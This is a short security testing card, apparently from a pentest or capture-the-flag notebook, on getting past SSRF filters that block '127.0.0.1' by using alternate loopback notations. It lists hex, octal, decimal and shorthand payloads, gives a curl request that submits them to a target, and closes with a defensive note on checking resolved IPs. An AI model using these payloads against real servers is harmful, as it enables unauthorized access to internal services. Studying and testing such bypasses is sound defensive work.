# Alternate Loopback Host Bypass

## Context

Use only in authorized labs, owned applications, in-scope bug bounty targets, or defensive validation.

Apply when a server-side fetcher blocks obvious internal hosts like `127.0.0.1` or `localhost`, but still accepts attacker-controlled URLs for outbound requests.

## Requirements

- Direct loopback payloads are blocked.
- The application reflects fetched content or useful metadata.
- The target runtime accepts alternate IPv4 loopback notation.

## Payloads

Try these in order:

```text
http://127.1:[port]/
http://0x7f000001:[port]/
http://0177.0.0.1:[port]/
http://2130706433:[port]/
```

## Minimal Test

```bash
curl -sS -X POST "https://[host]/post" \
  --data-urlencode "message=http://127.1:[port]/"
```

## Expected Signals

Blocked literals:

```text
host blocked by policy
destination not allowed
internal infrastructure refused
```

Working alternate forms may return:

```text
internal banner
preview title from internal service
metadata description
lab flag
```

## Why It Works

```text
validator-visible host: not literally 127.0.0.1 or localhost
executor destination: loopback after normalization/resolution
```

The filter blocks only a few raw strings. The HTTP client still resolves the host to `127.0.0.1`.

## Why It Fails

- The application canonicalizes the hostname before enforcing the block.
- The resolver or parser rejects hex, octal, or shorthand host forms.
- The network layer blocks loopback by resolved IP.
- The fetch is blind, so you cannot see the proof even if it worked.

## Variant Notes

| Form | Meaning |
|---|---|
| `127.1` | shorthand loopback |
| `0x7f000001` | hex integer form |
| `0177.0.0.1` | octal-style first octet |
| `2130706433` | decimal integer form |

Not every stack accepts every form, so test one at a time and record exact behavior.

## Common Mistakes

- Assuming IPv6 loopback bypass will work just because IPv4 alternates do.
- Testing only one alternate form and stopping if it fails.
- Forgetting that different URL parsers normalize integer IPs differently.
- Using reusable payload files to store live flags or target-specific secrets.

## Defensive Note

Any SSRF defense that compares host strings instead of final resolved IPs is brittle. Normalize first, decide second.
